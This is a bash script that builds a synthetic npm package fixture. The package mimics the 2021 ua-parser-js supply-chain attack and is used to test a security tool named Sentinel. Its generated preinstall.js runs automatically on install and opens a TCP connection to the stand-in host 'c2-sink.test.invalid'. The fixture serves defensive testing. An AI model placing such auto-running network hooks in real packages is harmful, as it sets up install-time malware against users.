#!/bin/bash
# tools/vendor-ua-parser-js.sh — deterministic builder for the synthetic
# ua-parser-js@0.7.29 fixture used by Sentinel's VAL-01 e2e validation.
#
# *** SYNTHETIC MOCK ***
#
# This script does NOT vendor any real malicious bytes. It constructs a
# hand-rolled mock that reproduces the SHAPE of the historical 2021
# ua-parser-js@0.7.29 supply-chain attack — a postinstall script that opens
# an outbound TCP connection — without containing any real malware, miner
# payload, exfil keylogger, or live C2 hostname.
#
# Why synthetic instead of a real-tarball reconstruction?
#   The original Plan 05-01 specified reconstruction from public github
#   commits 90fb09d8 / 8742775c / e09c01ed. Those commits were SCRUBBED
#   from github.com/faisalman/ua-parser-js in early 2026 (404 on github,
#   no Wayback snapshot). CONTEXT D-06 explicitly named "synthetic mock"
#   as the legitimate v0.2+ alternative if upstream fidelity becomes
#   unattainable. Per the orchestrator-confirmed Rule 4 architectural
#   pivot recorded in Plan 05-01 SUMMARY, that escape hatch is now
#   invoked.
#
# What this script DOES (deterministic, byte-identical across hosts):
#   1. Construct an in-tempdir `package/` tree:
#      - package.json (synthetic, declares preinstall script)
#      - preinstall.js (opens TCP to c2-sink.test.invalid:443, exits 0)
#      - index.js (empty stub so `require('ua-parser-js')` does not throw)
#   2. Pack the tree into a .tgz with normalized owner/group/mtime so the
#      output is byte-identical regardless of build host.
#   3. Compute shasum -a 256 of the output and verify it matches the
#      EXPECTED_OUTPUT_SHA256 pin embedded in this script.
#   4. Copy the verified .tgz into the fixture directory.
#
# Pin bootstrap workflow:
#   First run:               bash tools/vendor-ua-parser-js.sh
#                            (script prints actual hash, refuses to write
#                             fixture; pin is still <FILL_ON_FIRST_RUN>)
#   Embed the pin:           bash tools/vendor-ua-parser-js.sh --update-pin
#                            (script accepts the freshly-computed hash and
#                             rewrites EXPECTED_OUTPUT_SHA256 in place)
#   Verify clean re-run:     bash tools/vendor-ua-parser-js.sh
#                            (exit 0; fixture written; subsequent runs are
#                             tamper-detection)
#
# CI never runs this script. CI verifies the COMMITTED tarball against the
# pinned EXPECTED_OUTPUT_SHA256 (per CONTEXT D-02 / D-15).
#
# macOS BSD shell tooling (RESEARCH §Environment Availability):
#   - shasum -a 256       (NOT sha256sum — Apple ships shasum)
#   - sed -i ''           (BSD sed: empty string after -i is REQUIRED in-place; GNU sed differs)
#   - tar (libarchive)    (BSD/libarchive bsdtar 3.x — accepts --uid/--gid/--uname/--gname
#                          for normalized ownership; mtime determinism via touch + gzip -n)
#
# Zip-slip safety note: this script does not extract any input tarball
# (synthetic mocks have no upstream source). The `--no-same-owner` and
# `--no-same-permissions` extraction guards from the original
# reconstruction recipe are therefore not present. If a future revision
# re-introduces an extraction step, those flags MUST be re-added — see
# RESEARCH §Security Domain V12.
#
set -euo pipefail

# Paths.
script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
repo_root="$(cd "$script_dir/.." && pwd)"
fixture_dir="$repo_root/crates/sentinel-e2e/fixtures/ua-parser-js-0.7.29-sanitized"
tempdir="$(mktemp -d)"
trap 'rm -rf "$tempdir"' EXIT

# ---------------------------------------------------------------------------
# Pinned hash. Replace <FILL_ON_FIRST_RUN> via the --update-pin flow above.
# ---------------------------------------------------------------------------
EXPECTED_OUTPUT_SHA256="9398ea5503135f17bc0c424e6373ddce7c0e113d23577a136638dd7ddcdce984"

# Determinism knobs.
SOURCE_DATE_EPOCH=1577836800   # 2020-01-01T00:00:00Z UTC
SINK_HOST="c2-sink.test.invalid"
SINK_PORT="443"

# CLI flag: --update-pin rewrites EXPECTED_OUTPUT_SHA256 in this script in-place.
update_pin=0
if [ "${1:-}" = "--update-pin" ]; then
    update_pin=1
fi

# ---------------------------------------------------------------------------
# Step 1: write the synthetic package/ tree.
# ---------------------------------------------------------------------------
echo ">>> Step 1: write synthetic package/ tree"
build_dir="$tempdir/build"
pkg_dir="$build_dir/package"
mkdir -p "$pkg_dir"

cat > "$pkg_dir/package.json" <<'JSON'
{
  "name": "ua-parser-js",
  "version": "0.7.29",
  "description": "Synthetic mock of ua-parser-js@0.7.29 for Sentinel VAL-01 e2e validation. Reproduces the postinstall->network-egress supply-chain attack shape; contains no real malicious bytes.",
  "scripts": {
    "preinstall": "node preinstall.js"
  },
  "main": "index.js"
}
JSON

# preinstall.js — synthetic postinstall hook. Opens an outbound TCP connection
# to a sink host (c2-sink.test.invalid) on port 443, prints a marker line to
# stdout, and exits 0 regardless of connect outcome. Sentinel's hook dylib
# blocks the connect at libc; the test harness asserts on the JSONL Decision
# row emitted by the daemon.
cat > "$pkg_dir/preinstall.js" <<JS
// Synthetic supply-chain attack shape — reproduces postinstall->network-egress
// without containing any real malicious bytes. Sentinel VAL-01 asserts that
// the connection attempt below is intercepted and denied.
'use strict';
var net = require('net');
process.stdout.write('ua-parser-js-mock: attempting connect to ${SINK_HOST}:${SINK_PORT}\n');
var sock = net.createConnection({ host: '${SINK_HOST}', port: ${SINK_PORT} });
sock.on('error', function () { /* swallow — Sentinel may EHOSTUNREACH us */ });
sock.on('connect', function () { try { sock.destroy(); } catch (_) {} });
// Exit 0 immediately so npm install does not abort before Sentinel's
// JSONL Decision row is observable. The connection attempt is the
// observable side-effect VAL-01 asserts on.
process.exit(0);
JS

# index.js — empty stub so require('ua-parser-js') after install succeeds.
cat > "$pkg_dir/index.js" <<'JS'
'use strict';
module.exports = {};
JS

echo "    package/package.json:  $(wc -c < "$pkg_dir/package.json" | tr -d ' ') bytes"
echo "    package/preinstall.js: $(wc -c < "$pkg_dir/preinstall.js" | tr -d ' ') bytes"
echo "    package/index.js:      $(wc -c < "$pkg_dir/index.js" | tr -d ' ') bytes"

# ---------------------------------------------------------------------------
# Step 2: deterministic pack.
# ---------------------------------------------------------------------------
echo ">>> Step 2: pack -> deterministic .tgz"
out_tgz="$tempdir/ua-parser-js-0.7.29-sanitized.tgz"

# Determinism strategy:
#   - Fixed mtime via touch -t (every file + the package/ dir).
#   - bsdtar accepts --uid/--gid/--uname/--gname for normalized ownership.
#   - Sort entries alphabetically (find | LC_ALL=C sort) so archive layout
#     is stable regardless of filesystem traversal order.
#   - gzip -n strips embedded mtime/filename from gzip header.
#
# Note: Apple-shipped /usr/bin/tar is libarchive bsdtar 3.x (verified by
# `tar --version`). The flags below are bsdtar-specific. If a host has GNU
# tar on PATH ahead of /usr/bin/tar, the explicit /usr/bin/tar invocation
# below sidesteps it; if /usr/bin/tar is itself replaced, the pin failure
# is the safety net.
# BSD touch does not accept `-d @epoch` (that's GNU). Use `-t [[CC]YY]MMDDhhmm[.SS]`.
# SOURCE_DATE_EPOCH=1577836800 -> 2020-01-01T00:00:00Z -> 202001010000.00
# (Directory mtime is not used — tar packs file entries only; see -type f below.)
touch -t 202001010000.00 \
    "$pkg_dir/package.json" "$pkg_dir/preinstall.js" "$pkg_dir/index.js"

uncompressed_tar="$tempdir/sanitized.tar"
(
    cd "$build_dir"
    # Sorted entry list keeps tar layout stable across filesystem ordering.
    # mtimes are already normalized by the touch above; tar is bsdtar
    # (libarchive) on macOS — verified by `tar --version`. --uid/--gid/
    # --uname/--gname normalize ownership without depending on the host
    # filesystem's recorded uids/gids.
    #
    # find ... -type f (NOT -print) lists only file entries. Listing the
    # directory `package/` AND its descendants would cause tar to add each
    # file twice (once when tar recurses into the dir entry, once when the
    # explicit file entry is processed). The directory header is created
    # implicitly by tar when the first file under `package/` is added; npm
    # pack output is structured the same way.
    find package -type f -print | LC_ALL=C sort | \
        /usr/bin/tar -cf "$uncompressed_tar" \
            --uid 0 --gid 0 --uname '' --gname '' \
            -T -
)

# gzip -n suppresses original-filename and mtime fields in the gzip header.
gzip -n -9 < "$uncompressed_tar" > "$out_tgz"

# ---------------------------------------------------------------------------
# Step 3: hash + verify against pin.
# ---------------------------------------------------------------------------
actual_output=$(shasum -a 256 "$out_tgz" | awk '{print $1}')
echo "    output SHA-256: $actual_output"

if [ "$update_pin" = "1" ]; then
    # In-place rewrite of EXPECTED_OUTPUT_SHA256. BSD sed in-place: `sed -i ''`.
    sed -i '' \
        "s|^EXPECTED_OUTPUT_SHA256=\".*\"|EXPECTED_OUTPUT_SHA256=\"$actual_output\"|" \
        "$script_dir/vendor-ua-parser-js.sh"
    echo ""
    echo "EXPECTED_OUTPUT_SHA256 pin updated in-place to:"
    echo "  $actual_output"
    echo ""
    echo "Re-run \`bash tools/vendor-ua-parser-js.sh\` (without --update-pin) to verify."
    exit 0
fi

if [ "$EXPECTED_OUTPUT_SHA256" = "<FILL_ON_FIRST_RUN>" ]; then
    echo ""
    echo "Pin not yet set. Re-run with --update-pin to embed the hash above:"
    echo "  bash tools/vendor-ua-parser-js.sh --update-pin"
    exit 1
fi

if [ "$actual_output" != "$EXPECTED_OUTPUT_SHA256" ]; then
    echo "FATAL: output tarball hash mismatch"
    echo "  expected: $EXPECTED_OUTPUT_SHA256"
    echo "  actual:   $actual_output"
    exit 1
fi

# ---------------------------------------------------------------------------
# Step 4: copy verified output into fixture directory.
# ---------------------------------------------------------------------------
mkdir -p "$fixture_dir"
cp "$out_tgz" "$fixture_dir/ua-parser-js-0.7.29-sanitized.tgz"

echo ""
echo "Done. Committed-output path: $fixture_dir/ua-parser-js-0.7.29-sanitized.tgz"
echo "  output SHA-256: $actual_output"
